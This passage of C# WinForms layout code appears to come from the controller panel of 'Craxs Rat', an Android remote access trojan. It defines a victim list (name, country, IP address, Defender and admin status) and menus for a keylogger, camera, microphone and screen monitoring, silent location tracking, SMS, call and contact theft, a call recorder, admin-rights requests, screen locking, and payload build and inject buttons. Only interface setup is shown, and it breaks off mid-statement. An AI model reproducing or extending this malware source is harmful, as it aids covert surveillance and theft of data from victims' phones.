			this.HBlockbtn = new DrakeUIButtonIcon();
			this.locationbtn = new DrakeUIButtonIcon();
			this.keyloggerbtn = new DrakeUIButtonIcon();
			this.DrakeUIButtonIcon5 = new DrakeUIButtonIcon();
			this.callsbtn = new DrakeUIButtonIcon();
			this.label16 = new Label();
			this.DrakeUIButtonIcon9 = new DrakeUIButtonIcon();
			this.DrakeUIButtonIcon6 = new DrakeUIButtonIcon();
			this.DrakeUIButtonIcon8 = new DrakeUIButtonIcon();
			this.Hinfobtn = new DrakeUIButtonIcon();
			this.DrakeUIButtonIcon3 = new DrakeUIButtonIcon();
			this.micbtn = new DrakeUIButtonIcon();
			this.screenbtn = new DrakeUIButtonIcon();
			this.contactbtn = new DrakeUIButtonIcon();
			this.accountbtn = new DrakeUIButtonIcon();
			this.applicationsbtn = new DrakeUIButtonIcon();
			this.filebtn = new DrakeUIButtonIcon();
			this.screenreadbtn = new DrakeUIButtonIcon();
			this.camerabtn = new DrakeUIButtonIcon();
			this.DrakeUIButtonIcon4 = new DrakeUIButtonIcon();
			this.smsbtn = new DrakeUIButtonIcon();
			this.infotitlepanel = new DrakeUITitlePanel();
			this.infopanel = new Panel();
			this.Panel5 = new Panel();
			this.callspanel = new DrakeUITitlePanel();
			this.DGVCALLS = new DataGridView();
			this.DataGridViewImageColumn3 = new DataGridViewImageColumn();
			this.DataGridViewTextBoxColumn2 = new DataGridViewTextBoxColumn();
			this.mappanel = new DrakeUITitlePanel();
			this.MapPannel = new Panel();
			this.notifispanel = new DrakeUITitlePanel();
			this.DGVNOTF = new DataGridView();
			this.cliimg = new DataGridViewImageColumn();
			this.notitext = new DataGridViewTextBoxColumn();
			this.Panel2 = new Panel();
			this.infobox = new DrakeUIGroupBox();
			this.infotext = new DrakeUILabel();
			this.DrakeUIAvatar3 = new DrakeUIAvatar();
			this.ReciveBox = new DrakeUIGroupBox();
			this.recvtotal = new DrakeUILabel();
			this.DrakeUIAvatar6 = new DrakeUIAvatar();
			this.SentBox = new DrakeUIGroupBox();
			this.senttotal = new DrakeUILabel();
			this.DrakeUIAvatar7 = new DrakeUIAvatar();
			this.RecentBox = new DrakeUIGroupBox();
			this.lastclienttext = new DrakeUILabel();
			this.lastclientpic = new DrakeUIAvatar();
			this.connectionpanel = new DrakeUITitlePanel();
			this.DataLog = new DataGridView();
			this.DataGridViewImageColumn2 = new DataGridViewImageColumn();
			this.DataGridViewTextBoxColumn5 = new DataGridViewTextBoxColumn();
			this.DataGridViewTextBoxColumn4 = new DataGridViewTextBoxColumn();
			this.DataGridViewTextBoxColumn7 = new DataGridViewTextBoxColumn();
			this.dattim = new DataGridViewTextBoxColumn();
			this.ctxconnection_1 = new DrakeUIContextMenuStrip();
			this.ToolStripMenuItem1 = new ToolStripMenuItem();
			this.blockpanel = new DrakeUITitlePanel();
			this.DGVblocked = new DataGridView();
			this.DataGridViewImageColumn1 = new DataGridViewImageColumn();
			this.DataGridViewTextBoxColumn1 = new DataGridViewTextBoxColumn();
			this.ctxconnection = new DrakeUIContextMenuStrip();
			this.BlockClientToolStripMenuItem = new ToolStripMenuItem();
			this.TopPanel = new Panel();
			this.DrakeUIButtonIcon2 = new DrakeUIButtonIcon();
			this.DrakeUIButtonIcon1 = new DrakeUIButtonIcon();
			this.DrakeUIButtonIcon13 = new DrakeUIButtonIcon();
			this.DrakeUIButtonIcon12 = new DrakeUIButtonIcon();
			this.Panel3 = new Panel();
			this.Connection_btn = new DrakeUIButtonIcon();
			this.blockbtn = new DrakeUIButtonIcon();
			this.Clients_Btn = new DrakeUIButtonIcon();
			this.clearbtn = new DrakeUIAvatar();
			this.Home_Btn = new DrakeUIButtonIcon();
			this.Build_btn = new DrakeUIButtonIcon();
			this.Panel8 = new Panel();
			this.Label1 = new Label();
			this.PictureBox1 = new PictureBox();
			this.inject_btn = new DrakeUIButtonIcon();
			this.About_btn = new DrakeUIButtonIcon();
			this.Settings_btn = new DrakeUIButtonIcon();
			this.RightPanel = new Panel();
			this.StatusPanel = new Panel();
			this.infolowtext = new Label();
			this.ToolTip1 = new ToolTip(this.components);
			this.Timer1 = new System.Windows.Forms.Timer(this.components);
			this.notifiform = new DrakeUIToolTip(this.components);
			this.MonitorTimer = new System.Windows.Forms.Timer(this.components);
			this.mapupdater = new System.Windows.Forms.Timer(this.components);
			this.ToolTips = new DrakeUIToolTip(this.components);
			this.Mainpanel.SuspendLayout();
			this.DashboardPanel.SuspendLayout();
			((ISupportInitialize)this.ClientsWindow).BeginInit();
			this.DrakeUIContextMenuStrip1.SuspendLayout();
			this.Panel6.SuspendLayout();
			((ISupportInitialize)this.TCavatar).BeginInit();
			this.Panel7.SuspendLayout();
			this.infotitlepanel.SuspendLayout();
			this.infopanel.SuspendLayout();
			this.Panel5.SuspendLayout();
			this.callspanel.SuspendLayout();
			((ISupportInitialize)this.DGVCALLS).BeginInit();
			this.mappanel.SuspendLayout();
			this.notifispanel.SuspendLayout();
			((ISupportInitialize)this.DGVNOTF).BeginInit();
			this.Panel2.SuspendLayout();
			this.infobox.SuspendLayout();
			this.ReciveBox.SuspendLayout();
			this.SentBox.SuspendLayout();
			this.RecentBox.SuspendLayout();
			this.connectionpanel.SuspendLayout();
			((ISupportInitialize)this.DataLog).BeginInit();
			this.ctxconnection_1.SuspendLayout();
			this.blockpanel.SuspendLayout();
			((ISupportInitialize)this.DGVblocked).BeginInit();
			this.ctxconnection.SuspendLayout();
			this.TopPanel.SuspendLayout();
			this.Panel3.SuspendLayout();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.StatusPanel.SuspendLayout();
			base.SuspendLayout();
			this.notfi.Icon = (Icon)componentResourceManager.GetObject("notfi.Icon");
			this.notfi.Text = "Craxs Rat";
			this.notfi.Visible = true;
			this.TOpacity.Interval = 10;
			this.Mainpanel.Controls.Add(this.infotitlepanel);
			this.Mainpanel.Controls.Add(this.DashboardPanel);
			this.Mainpanel.Controls.Add(this.connectionpanel);
			this.Mainpanel.Controls.Add(this.blockpanel);
			this.Mainpanel.Controls.Add(this.TopPanel);
			this.Mainpanel.Controls.Add(this.Panel3);
			this.Mainpanel.Controls.Add(this.RightPanel);
			this.Mainpanel.Controls.Add(this.StatusPanel);
			this.Mainpanel.Dock = DockStyle.Fill;
			this.Mainpanel.Location = new Point(0, 0);
			this.Mainpanel.Margin = new Padding(4);
			this.Mainpanel.Name = "Mainpanel";
			this.Mainpanel.Size = new Size(1607, 834);
			this.Mainpanel.TabIndex = 3;
			this.DashboardPanel.Controls.Add(this.ClientsWindow);
			this.DashboardPanel.Controls.Add(this.Panel6);
			this.DashboardPanel.Controls.Add(this.Panel4);
			this.DashboardPanel.Controls.Add(this.Panel7);
			this.DashboardPanel.Dock = DockStyle.Fill;
			this.DashboardPanel.FillColor = Color.Black;
			this.DashboardPanel.Font = new Font("Microsoft Sans Serif", 12f);
			this.DashboardPanel.ForeColor = Color.White;
			this.DashboardPanel.Location = new Point(138, 34);
			this.DashboardPanel.Margin = new Padding(5, 6, 5, 6);
			this.DashboardPanel.Name = "DashboardPanel";
			this.DashboardPanel.RectColor = Color.Black;
			this.DashboardPanel.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DashboardPanel.Size = new Size(1456, 780);
			this.DashboardPanel.Style = UIStyle.Custom;
			this.DashboardPanel.StyleCustomMode = true;
			this.DashboardPanel.TabIndex = 0;
			this.DashboardPanel.Text = "Clients";
			this.DashboardPanel.TextAlignment = ContentAlignment.MiddleRight;
			this.DashboardPanel.TitleColor = Color.Black;
			this.DashboardPanel.TitleHeight = 0;
			this.ClientsWindow.AllowUserToAddRows = false;
			this.ClientsWindow.AllowUserToDeleteRows = false;
			this.ClientsWindow.AllowUserToResizeColumns = false;
			this.ClientsWindow.AllowUserToResizeRows = false;
			dataGridViewCellStyle.BackColor = Color.Black;
			dataGridViewCellStyle.Font = new Font("Roboto", 9f);
			dataGridViewCellStyle.ForeColor = Color.White;
			dataGridViewCellStyle.SelectionBackColor = Color.FromArgb(157, 5, 17);
			dataGridViewCellStyle.SelectionForeColor = Color.White;
			this.ClientsWindow.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
			this.ClientsWindow.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
			this.ClientsWindow.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
			this.ClientsWindow.BackgroundColor = Color.Black;
			this.ClientsWindow.CellBorderStyle = DataGridViewCellBorderStyle.SingleHorizontal;
			this.ClientsWindow.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = Color.Black;
			dataGridViewCellStyle2.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle2.ForeColor = Color.White;
			dataGridViewCellStyle2.SelectionBackColor = Color.FromArgb(157, 5, 17);
			dataGridViewCellStyle2.SelectionForeColor = Color.White;
			dataGridViewCellStyle2.WrapMode = DataGridViewTriState.True;
			this.ClientsWindow.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
			this.ClientsWindow.ColumnHeadersHeight = 32;
			this.ClientsWindow.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
			this.ClientsWindow.ColumnHeadersVisible = false;
			this.ClientsWindow.Columns.AddRange(new DataGridViewColumn[]
			{
				this.cliscren,
				this.cliav,
				this.cliflg,
				this.cliname,
				this.clicountry,
				this.cliip,
				this.andver,
				this.phondmod,
				this.clinoti,
				this.clicalls,
				this.clibtry,
				this.cliwifi,
				this.cliavt,
				this.defcli,
				this.isadmincli,
				this.clipng
			});
			this.ClientsWindow.ContextMenuStrip = this.DrakeUIContextMenuStrip1;
			this.ClientsWindow.Cursor = Cursors.Hand;
			dataGridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = Color.Black;
			dataGridViewCellStyle3.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle3.ForeColor = Color.White;
			dataGridViewCellStyle3.SelectionBackColor = Color.FromArgb(157, 5, 17);
			dataGridViewCellStyle3.SelectionForeColor = Color.White;
			dataGridViewCellStyle3.WrapMode = DataGridViewTriState.False;
			this.ClientsWindow.DefaultCellStyle = dataGridViewCellStyle3;
			this.ClientsWindow.Dock = DockStyle.Fill;
			this.ClientsWindow.EnableHeadersVisualStyles = false;
			this.ClientsWindow.Font = new Font("Microsoft Sans Serif", 12f);
			this.ClientsWindow.GridColor = Color.FromArgb(157, 5, 17);
			this.ClientsWindow.Location = new Point(10, 47);
			this.ClientsWindow.Name = "ClientsWindow";
			this.ClientsWindow.ReadOnly = true;
			this.ClientsWindow.RectColor = Color.FromArgb(157, 5, 17);
			this.ClientsWindow.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle4.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle4.BackColor = Color.Black;
			dataGridViewCellStyle4.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle4.ForeColor = Color.White;
			dataGridViewCellStyle4.SelectionBackColor = Color.FromArgb(157, 5, 17);
			dataGridViewCellStyle4.SelectionForeColor = Color.White;
			dataGridViewCellStyle4.WrapMode = DataGridViewTriState.True;
			this.ClientsWindow.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
			this.ClientsWindow.RowHeadersVisible = false;
			dataGridViewCellStyle5.BackColor = Color.Black;
			dataGridViewCellStyle5.Font = new Font("Roboto", 9f);
			dataGridViewCellStyle5.ForeColor = Color.White;
			dataGridViewCellStyle5.SelectionBackColor = Color.FromArgb(157, 5, 17);
			dataGridViewCellStyle5.SelectionForeColor = Color.White;
			this.ClientsWindow.RowsDefaultCellStyle = dataGridViewCellStyle5;
			this.ClientsWindow.RowTemplate.Height = 29;
			this.ClientsWindow.ScrollBars = ScrollBars.Vertical;
			this.ClientsWindow.SelectedIndex = -1;
			this.ClientsWindow.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
			this.ClientsWindow.ShowCellErrors = false;
			this.ClientsWindow.ShowEditingIcon = false;
			this.ClientsWindow.ShowRowErrors = false;
			this.ClientsWindow.Size = new Size(1446, 687);
			this.ClientsWindow.StripeEvenColor = Color.Black;
			this.ClientsWindow.StripeOddColor = Color.Black;
			this.ClientsWindow.Style = UIStyle.Custom;
			this.ClientsWindow.StyleCustomMode = true;
			this.ClientsWindow.TabIndex = 35;
			this.cliscren.FillWeight = 25f;
			this.cliscren.HeaderText = "Screen";
			this.cliscren.Name = "cliscren";
			this.cliscren.ReadOnly = true;
			this.cliav.FillWeight = 45f;
			this.cliav.HeaderText = "avatar";
			this.cliav.Name = "cliav";
			this.cliav.ReadOnly = true;
			this.cliflg.FillWeight = 20f;
			this.cliflg.HeaderText = "Flag";
			this.cliflg.Name = "cliflg";
			this.cliflg.ReadOnly = true;
			this.cliname.FillWeight = 90f;
			this.cliname.HeaderText = "Name";
			this.cliname.Name = "cliname";
			this.cliname.ReadOnly = true;
			this.clicountry.FillWeight = 50f;
			this.clicountry.HeaderText = "Country";
			this.clicountry.Name = "clicountry";
			this.clicountry.ReadOnly = true;
			this.cliip.FillWeight = 70f;
			this.cliip.HeaderText = "Address";
			this.cliip.Name = "cliip";
			this.cliip.ReadOnly = true;
			this.andver.FillWeight = 50f;
			this.andver.HeaderText = "Android";
			this.andver.Name = "andver";
			this.andver.ReadOnly = true;
			this.phondmod.FillWeight = 50f;
			this.phondmod.HeaderText = "Phone";
			this.phondmod.Name = "phondmod";
			this.phondmod.ReadOnly = true;
			this.clinoti.FillWeight = 15f;
			this.clinoti.HeaderText = "Notifi";
			this.clinoti.Name = "clinoti";
			this.clinoti.ReadOnly = true;
			this.clicalls.FillWeight = 15f;
			this.clicalls.HeaderText = "Calls";
			this.clicalls.Name = "clicalls";
			this.clicalls.ReadOnly = true;
			this.clibtry.FillWeight = 35f;
			this.clibtry.HeaderText = "Battery";
			this.clibtry.Name = "clibtry";
			this.clibtry.ReadOnly = true;
			this.cliwifi.FillWeight = 35f;
			this.cliwifi.HeaderText = "Wifi";
			this.cliwifi.Name = "cliwifi";
			this.cliwifi.ReadOnly = true;
			this.cliavt.FillWeight = 60f;
			this.cliavt.HeaderText = "Active";
			this.cliavt.Name = "cliavt";
			this.cliavt.ReadOnly = true;
			this.defcli.FillWeight = 40f;
			this.defcli.HeaderText = "Defender";
			this.defcli.Name = "defcli";
			this.defcli.ReadOnly = true;
			this.isadmincli.FillWeight = 25f;
			this.isadmincli.HeaderText = "isAdmin";
			this.isadmincli.Name = "isadmincli";
			this.isadmincli.ReadOnly = true;
			this.clipng.AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
			this.clipng.FillWeight = 15f;
			this.clipng.HeaderText = "Ping";
			this.clipng.Name = "clipng";
			this.clipng.ReadOnly = true;
			this.clipng.Width = 5;
			this.DrakeUIContextMenuStrip1.BackColor = Color.Black;
			this.DrakeUIContextMenuStrip1.Font = new Font("Microsoft Sans Serif", 12f);
			this.DrakeUIContextMenuStrip1.ImageScalingSize = new Size(20, 20);
			this.DrakeUIContextMenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.ManagersToolStripMenuItem,
				this.ToolStripSeparator1,
				this.MonitorsToolStripMenuItem,
				this.ToolStripSeparator3,
				this.AdminToolStripMenuItem,
				this.ToolStripSeparator6,
				this.ToolStripMenuItem4,
				this.ToolStripSeparator5,
				this.ExtraToolStripMenuItem,
				this.ToolStripSeparator7,
				this.ToolStripMenuItem13,
				this.ToolStripSeparator8,
				this.KeyboardToolStripMenuItem,
				this.ToolStripSeparator4,
				this.ClientFolderToolStripMenuItem
			});
			this.DrakeUIContextMenuStrip1.Name = "DrakeUIContextMenuStrip1";
			this.DrakeUIContextMenuStrip1.ShowImageMargin = false;
			this.DrakeUIContextMenuStrip1.Size = new Size(202, 286);
			this.ManagersToolStripMenuItem.BackColor = Color.Black;
			this.ManagersToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.FilesToolStripMenuItem,
				this.SMSToolStripMenuItem,
				this.CallsToolStripMenuItem1,
				this.ContactsToolStripMenuItem,
				this.AccountsToolStripMenuItem,
				this.ApplicationsToolStripMenuItem,
				this.ToolStripMenuItem12
			});
			this.ManagersToolStripMenuItem.ForeColor = Color.White;
			this.ManagersToolStripMenuItem.Name = "ManagersToolStripMenuItem";
			this.ManagersToolStripMenuItem.Size = new Size(201, 30);
			this.ManagersToolStripMenuItem.Text = "Managers";
			this.FilesToolStripMenuItem.BackColor = Color.Black;
			this.FilesToolStripMenuItem.ForeColor = Color.White;
			this.FilesToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("FilesToolStripMenuItem.Image");
			this.FilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.FilesToolStripMenuItem.Name = "FilesToolStripMenuItem";
			this.FilesToolStripMenuItem.Size = new Size(211, 42);
			this.FilesToolStripMenuItem.Text = "Files";
			this.FilesToolStripMenuItem.TextImageRelation = TextImageRelation.ImageAboveText;
			this.SMSToolStripMenuItem.BackColor = Color.Black;
			this.SMSToolStripMenuItem.ForeColor = Color.White;
			this.SMSToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("SMSToolStripMenuItem.Image");
			this.SMSToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.SMSToolStripMenuItem.Name = "SMSToolStripMenuItem";
			this.SMSToolStripMenuItem.Size = new Size(211, 42);
			this.SMSToolStripMenuItem.Text = "SMS";
			this.CallsToolStripMenuItem1.BackColor = Color.Black;
			this.CallsToolStripMenuItem1.ForeColor = Color.White;
			this.CallsToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("CallsToolStripMenuItem1.Image");
			this.CallsToolStripMenuItem1.ImageScaling = ToolStripItemImageScaling.None;
			this.CallsToolStripMenuItem1.Name = "CallsToolStripMenuItem1";
			this.CallsToolStripMenuItem1.Size = new Size(211, 42);
			this.CallsToolStripMenuItem1.Text = "Calls";
			this.ContactsToolStripMenuItem.BackColor = Color.Black;
			this.ContactsToolStripMenuItem.ForeColor = Color.White;
			this.ContactsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ContactsToolStripMenuItem.Image");
			this.ContactsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.ContactsToolStripMenuItem.Name = "ContactsToolStripMenuItem";
			this.ContactsToolStripMenuItem.Size = new Size(211, 42);
			this.ContactsToolStripMenuItem.Text = "Contacts";
			this.AccountsToolStripMenuItem.BackColor = Color.Black;
			this.AccountsToolStripMenuItem.ForeColor = Color.White;
			this.AccountsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("AccountsToolStripMenuItem.Image");
			this.AccountsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.AccountsToolStripMenuItem.Name = "AccountsToolStripMenuItem";
			this.AccountsToolStripMenuItem.Size = new Size(211, 42);
			this.AccountsToolStripMenuItem.Text = "Accounts";
			this.ApplicationsToolStripMenuItem.BackColor = Color.Black;
			this.ApplicationsToolStripMenuItem.ForeColor = Color.White;
			this.ApplicationsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ApplicationsToolStripMenuItem.Image");
			this.ApplicationsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.ApplicationsToolStripMenuItem.Name = "ApplicationsToolStripMenuItem";
			this.ApplicationsToolStripMenuItem.Size = new Size(211, 42);
			this.ApplicationsToolStripMenuItem.Text = "Applications";
			this.ToolStripMenuItem12.BackColor = Color.Black;
			this.ToolStripMenuItem12.ForeColor = Color.White;
			this.ToolStripMenuItem12.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem12.Image");
			this.ToolStripMenuItem12.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem12.Name = "ToolStripMenuItem12";
			this.ToolStripMenuItem12.Size = new Size(211, 42);
			this.ToolStripMenuItem12.Text = "Permissions";
			this.ToolStripSeparator1.BackColor = Color.Black;
			this.ToolStripSeparator1.ForeColor = Color.Black;
			this.ToolStripSeparator1.Name = "ToolStripSeparator1";
			this.ToolStripSeparator1.Size = new Size(198, 6);
			this.MonitorsToolStripMenuItem.BackColor = Color.Black;
			this.MonitorsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ScreenMonitorToolStripMenuItem,
				this.ToolStripMenuItem14,
				this.CameraMonitorToolStripMenuItem,
				this.MicrophoneMonitorToolStripMenuItem,
				this.KeyloggerToolStripMenuItem1,
				this.LocationsMonitorToolStripMenuItem,
				this.WebBrowserToolStripMenuItem1,
				this.CallRecorderToolStripMenuItem,
				this.ToolStripMenuItem3,
				this.ScreenReaderToolStripMenuItem
			});
			this.MonitorsToolStripMenuItem.ForeColor = Color.White;
			this.MonitorsToolStripMenuItem.Name = "MonitorsToolStripMenuItem";
			this.MonitorsToolStripMenuItem.Size = new Size(201, 30);
			this.MonitorsToolStripMenuItem.Text = "Monitors";
			this.ScreenMonitorToolStripMenuItem.BackColor = Color.Black;
			this.ScreenMonitorToolStripMenuItem.ForeColor = Color.White;
			this.ScreenMonitorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ScreenMonitorToolStripMenuItem.Image");
			this.ScreenMonitorToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.ScreenMonitorToolStripMenuItem.Name = "ScreenMonitorToolStripMenuItem";
			this.ScreenMonitorToolStripMenuItem.Size = new Size(278, 42);
			this.ScreenMonitorToolStripMenuItem.Text = "Screen Monitor";
			this.ToolStripMenuItem14.BackColor = Color.Black;
			this.ToolStripMenuItem14.ForeColor = Color.White;
			this.ToolStripMenuItem14.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem14.Image");
			this.ToolStripMenuItem14.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem14.Name = "ToolStripMenuItem14";
			this.ToolStripMenuItem14.Size = new Size(278, 42);
			this.ToolStripMenuItem14.Text = "Screen Reader V2";
			this.CameraMonitorToolStripMenuItem.BackColor = Color.Black;
			this.CameraMonitorToolStripMenuItem.ForeColor = Color.White;
			this.CameraMonitorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CameraMonitorToolStripMenuItem.Image");
			this.CameraMonitorToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.CameraMonitorToolStripMenuItem.Name = "CameraMonitorToolStripMenuItem";
			this.CameraMonitorToolStripMenuItem.Size = new Size(278, 42);
			this.CameraMonitorToolStripMenuItem.Text = "Camera Monitor";
			this.MicrophoneMonitorToolStripMenuItem.BackColor = Color.Black;
			this.MicrophoneMonitorToolStripMenuItem.ForeColor = Color.White;
			this.MicrophoneMonitorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("MicrophoneMonitorToolStripMenuItem.Image");
			this.MicrophoneMonitorToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.MicrophoneMonitorToolStripMenuItem.Name = "MicrophoneMonitorToolStripMenuItem";
			this.MicrophoneMonitorToolStripMenuItem.Size = new Size(278, 42);
			this.MicrophoneMonitorToolStripMenuItem.Text = "Microphone Monitor";
			this.KeyloggerToolStripMenuItem1.BackColor = Color.Black;
			this.KeyloggerToolStripMenuItem1.ForeColor = Color.White;
			this.KeyloggerToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("KeyloggerToolStripMenuItem1.Image");
			this.KeyloggerToolStripMenuItem1.ImageScaling = ToolStripItemImageScaling.None;
			this.KeyloggerToolStripMenuItem1.Name = "KeyloggerToolStripMenuItem1";
			this.KeyloggerToolStripMenuItem1.Size = new Size(278, 42);
			this.KeyloggerToolStripMenuItem1.Text = "Keylogger";
			this.LocationsMonitorToolStripMenuItem.BackColor = Color.Black;
			this.LocationsMonitorToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.LiveModeToolStripMenuItem1,
				this.ToolStripSeparator2,
				this.SilentModeGOIPToolStripMenuItem
			});
			this.LocationsMonitorToolStripMenuItem.ForeColor = Color.White;
			this.LocationsMonitorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("LocationsMonitorToolStripMenuItem.Image");
			this.LocationsMonitorToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.LocationsMonitorToolStripMenuItem.Name = "LocationsMonitorToolStripMenuItem";
			this.LocationsMonitorToolStripMenuItem.Size = new Size(278, 42);
			this.LocationsMonitorToolStripMenuItem.Text = "Locations Monitor";
			this.LiveModeToolStripMenuItem1.BackColor = Color.Black;
			this.LiveModeToolStripMenuItem1.ForeColor = Color.White;
			this.LiveModeToolStripMenuItem1.Name = "LiveModeToolStripMenuItem1";
			this.LiveModeToolStripMenuItem1.Size = new Size(262, 30);
			this.LiveModeToolStripMenuItem1.Text = "Live Mode (GPS)";
			this.ToolStripSeparator2.BackColor = Color.Black;
			this.ToolStripSeparator2.ForeColor = Color.Black;
			this.ToolStripSeparator2.Name = "ToolStripSeparator2";
			this.ToolStripSeparator2.Size = new Size(259, 6);
			this.SilentModeGOIPToolStripMenuItem.BackColor = Color.Black;
			this.SilentModeGOIPToolStripMenuItem.ForeColor = Color.White;
			this.SilentModeGOIPToolStripMenuItem.Name = "SilentModeGOIPToolStripMenuItem";
			this.SilentModeGOIPToolStripMenuItem.Size = new Size(262, 30);
			this.SilentModeGOIPToolStripMenuItem.Text = "Silent Mode (GOIP)";
			this.WebBrowserToolStripMenuItem1.BackColor = Color.Black;
			this.WebBrowserToolStripMenuItem1.ForeColor = Color.White;
			this.WebBrowserToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("WebBrowserToolStripMenuItem1.Image");
			this.WebBrowserToolStripMenuItem1.ImageScaling = ToolStripItemImageScaling.None;
			this.WebBrowserToolStripMenuItem1.Name = "WebBrowserToolStripMenuItem1";
			this.WebBrowserToolStripMenuItem1.Size = new Size(278, 42);
			this.WebBrowserToolStripMenuItem1.Text = "Web Browser";
			this.CallRecorderToolStripMenuItem.BackColor = Color.Black;
			this.CallRecorderToolStripMenuItem.ForeColor = Color.White;
			this.CallRecorderToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CallRecorderToolStripMenuItem.Image");
			this.CallRecorderToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.CallRecorderToolStripMenuItem.Name = "CallRecorderToolStripMenuItem";
			this.CallRecorderToolStripMenuItem.Size = new Size(278, 42);
			this.CallRecorderToolStripMenuItem.Text = "Call Recorder";
			this.ToolStripMenuItem3.BackColor = Color.Black;
			this.ToolStripMenuItem3.ForeColor = Color.White;
			this.ToolStripMenuItem3.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem3.Image");
			this.ToolStripMenuItem3.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
			this.ToolStripMenuItem3.Size = new Size(278, 42);
			this.ToolStripMenuItem3.Text = "Auto Clicker";
			this.ScreenReaderToolStripMenuItem.BackColor = Color.Black;
			this.ScreenReaderToolStripMenuItem.ForeColor = Color.White;
			this.ScreenReaderToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ScreenReaderToolStripMenuItem.Image");
			this.ScreenReaderToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.ScreenReaderToolStripMenuItem.Name = "ScreenReaderToolStripMenuItem";
			this.ScreenReaderToolStripMenuItem.Size = new Size(278, 42);
			this.ScreenReaderToolStripMenuItem.Text = "Screen Reader";
			this.ToolStripSeparator3.BackColor = Color.Black;
			this.ToolStripSeparator3.ForeColor = Color.Black;
			this.ToolStripSeparator3.Name = "ToolStripSeparator3";
			this.ToolStripSeparator3.Size = new Size(198, 6);
			this.AdminToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.RequestAdminRightsToolStripMenuItem,
				this.LockScreenToolStripMenuItem,
				this.ToolStripMenuItem2
			});
			this.AdminToolStripMenuItem.ForeColor = Color.White;
			this.AdminToolStripMenuItem.Name = "AdminToolStripMenuItem";
			this.AdminToolStripMenuItem.Size = new Size(201, 30);
			this.AdminToolStripMenuItem.Text = "Admin";
			this.RequestAdminRightsToolStripMenuItem.BackColor = Color.Black;
			this.RequestAdminRightsToolStripMenuItem.ForeColor = Color.White;
			this.RequestAdminRightsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RequestAdminRightsToolStripMenuItem.Image");
			this.RequestAdminRightsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.RequestAdminRightsToolStripMenuItem.Name = "RequestAdminRightsToolStripMenuItem";
			this.RequestAdminRightsToolStripMenuItem.Size = new Size(297, 42);
			this.RequestAdminRightsToolStripMenuItem.Text = "Request Admin Rights";
			this.LockScreenToolStripMenuItem.BackColor = Color.Black;
			this.LockScreenToolStripMenuItem.ForeColor = Color.White;
			this.LockScreenToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("LockScreenToolStripMenuItem.Image");
			this.LockScreenToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.LockScreenToolStripMenuItem.Name = "LockScreenToolStripMenuItem";
			this.LockScreenToolStripMenuItem.Size = new Size(297, 42);
			this.LockScreenToolStripMenuItem.Text = "Lock Screen";
			this.ToolStripMenuItem2.BackColor = Color.Black;
			this.ToolStripMenuItem2.ForeColor = Color.White;
			this.ToolStripMenuItem2.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem2.Image");
			this.ToolStripMenuItem2.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
			this.ToolStripMenuItem2.Size = new Size(297, 42);
